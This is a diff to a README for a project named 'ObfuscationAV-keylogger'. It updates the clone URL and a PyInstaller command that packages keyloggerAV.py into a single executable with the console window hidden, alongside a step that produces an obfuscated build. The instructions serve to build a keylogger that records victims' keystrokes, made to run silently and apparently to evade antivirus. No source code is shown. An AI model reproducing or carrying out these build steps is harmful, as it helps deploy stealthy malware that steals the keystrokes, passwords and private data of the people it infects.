@@ -36,8 +36,8 @@ Before you get started, ensure you have:
 ### 1️⃣ Clone the Repository
 
 ```bash
-git clone https://github.com/your-username/KeyloggerAV.git
-cd KeyloggerAV
+git clone https://github.com/TheOnlySyntax/ObfuscationAV-keylogger
+cd ObfuscationAV-keylogger
 ```
 
 ### 2️⃣ Install Dependencies
@@ -69,12 +69,11 @@ An obfuscated version will appear in the `dist` folder.
 ### 🔹 3. Compile to Executable
 
 ```bash
-pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=pynput --icon=icon.ico keyloggerAV.py
+pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=pynput keyloggerAV.py
 ```
 - `--onefile`: Bundles everything into one `.exe`.
 - `--noconsole`: Hides the terminal.
 - `--hidden-import`: Ensures dependencies are included.
-- `--icon=icon.ico`: Adds an icon (replace `icon.ico` with your own).
 
 The compiled `.exe` will be in the `dist` folder.
 
